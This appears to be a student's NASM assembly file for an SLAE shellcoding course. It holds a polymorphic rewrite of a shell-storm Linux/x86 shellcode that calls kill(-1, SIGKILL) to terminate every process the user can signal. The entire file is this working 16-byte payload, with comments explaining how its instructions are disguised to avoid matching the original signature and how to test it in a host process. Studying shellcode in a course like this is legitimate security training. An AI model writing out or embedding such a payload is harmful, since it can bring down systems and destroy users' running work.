; Student ID     : SLAE-1250
; Student Name   : Jonathan "Chops" Crosby
; Assignment 6.1 : polymorphic kill all processes for Linux/x86 Assembly
; File Name      : kill-all-processes.nasm
; Shell Storm    : http://shell-storm.org/shellcode/files/shellcode-212.php

global _start

section .text

_start:

; kill(-1, SIGKILL)
xor eax, eax    ; needed to xor registers when called
mov ebx, eax    ; from the helper shellcode executable
                ; as eax and ebx are changed from zero
                ; or else we will get a segfault when
                ; actually running it

mov al, 0x63    ; moving 99 decimal into eax
sub al, 0x3E    ; subtracting 62 from 99 to make 37
                ; which is the decimal value for kill

mov bl, 0x01    ; move 0x01 into ebx
neg ebx         ; convert ebx to -1

mov cl, 0x09    ; moving 9 into ecx
                ; had our shellcode.c file written to ecx we would
                ; also have had to clear out ecx, but since it did
                ; not this allowed for us to save a few bytes.
                ; Be sure to carefully track register values through
                ; something like gdb when testing your payload in
                ; your host process. If we were not limited in our size
                ; I would have added an additional two bytes to xor
                ; out ecx too ... but as it stands this will be 16 bytes

int 0x80        ; make the call to the system interrupt to call kill
